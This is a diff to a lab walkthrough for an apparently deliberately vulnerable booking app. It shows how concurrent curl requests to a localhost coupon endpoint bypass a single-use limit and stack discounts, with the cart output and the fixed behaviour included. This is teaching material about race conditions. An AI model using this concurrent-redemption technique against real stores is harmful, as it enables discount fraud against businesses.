@@ -91,7 +91,7 @@ curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
   -d '{"code":"SUMMER20"}' | jq .
 ```
 
-Expected on the fourth call: `409 Conflict` — `"Coupon already exhausted"`.
+Expected on the fourth call: `409 Conflict` — `"Coupon has already been fully redeemed"`.
 
 ---
 
@@ -118,11 +118,20 @@ The 500 ms delay is artificial and exists to make the race window exploitable in
 
 ## Step 3 — Exploit the race condition
 
-Re-seed the database (or re-run with the original SAVE10 coupon, MaxUses=1).
-
-Send two requests simultaneously. Use `&` to background both before `wait`:
+Re-seed the database to reset coupon state:
 
 ```bash
+dotnet run --project src/BookingDojo.Api -- --seed-and-exit
+```
+
+Log in and send two requests simultaneously. Use `&` to background both before `wait`:
+
+```bash
+# Log in (cookie auth via BFF)
+curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"partner","password":"Partner1234!"}' | jq .
+
 # Both requests land while the other is sleeping — both pass the check
 curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
   -H "Content-Type: application/json" \
@@ -135,34 +144,56 @@ curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
 wait
 ```
 
-Expected (both succeed): two `200 OK` responses with `"discountPercent": 10`, even though `MaxUses = 1`.
+Expected: **both return `200 OK`** with `"discountPercent": 10`, even though `MaxUses = 1`.
 
-Verify that `UsesCount` now exceeds `MaxUses`:
+Now check your cart:
 
 ```bash
-# A third call still returns 409 because UsesCount (2) >= MaxUses (1)
-curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
-  -H "Content-Type: application/json" \
-  -d '{"code":"SAVE10"}' | jq .
+curl -s -b cookies.txt http://localhost:5001/bff/cart | jq .
 ```
+
+Expected cart state:
+
+```json
+{
+  "appliedCouponCode": "SAVE10",
+  "appliedCouponDiscountPercent": 10,
+  "appliedCouponCount": 2
+}
+```
+
+The server recorded **two redemptions**. At checkout the compound discount is applied:
+
+```
+$120.00  (base price)
+× 0.90   (first 10% off)  →  $108.00
+× 0.90   (second 10% off) →   $97.20
+```
+
+In the UI the coupon badge reads **"SAVE10 — 10% off × 2 (race condition!)"** and the cart total shows $97.20 instead of $108.00.
+
+This is the financial impact: the attacker extracted an extra $10.80 of discount that the coupon was never meant to grant.
 
 ---
 
 ## Step 4 — Scale the attack
 
-With more parallelism the impact is clearer:
+With more parallelism, more discount stacks:
 
 ```bash
-# 10 concurrent redemptions of a coupon with MaxUses=1
-for i in $(seq 1 10); do
+# 5 concurrent redemptions — resets first so count starts at 0
+curl -s -b cookies.txt -X DELETE \
+  "http://localhost:5001/bff/coupons/redeem?code=SAVE10"
+
+for i in $(seq 1 5); do
   curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
     -H "Content-Type: application/json" \
-    -d '{"code":"SAVE10"}' | jq -r '.message // .message' &
+    -d '{"code":"SAVE10"}' | jq -r '.message' &
 done
 wait
 ```
 
-Multiple "Coupon applied" responses confirm the limit was bypassed.
+Check the cart again — `appliedCouponCount` may be 3–5 (depends on how many requests beat the delay). Each additional application compounds: 5× at 10% = `$120 × 0.9⁵ = $70.87`.
 
 ---
 
@@ -191,7 +222,7 @@ curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
 wait
 ```
 
-Expected: exactly one `200 OK` and one `409 Conflict`.
+Expected: exactly one `200 OK` and one `409 Conflict`. The cart will show `appliedCouponCount: 1` and the discount is a single 10% — `$120 × 0.90 = $108.00`.
 
 The fixed code:
 
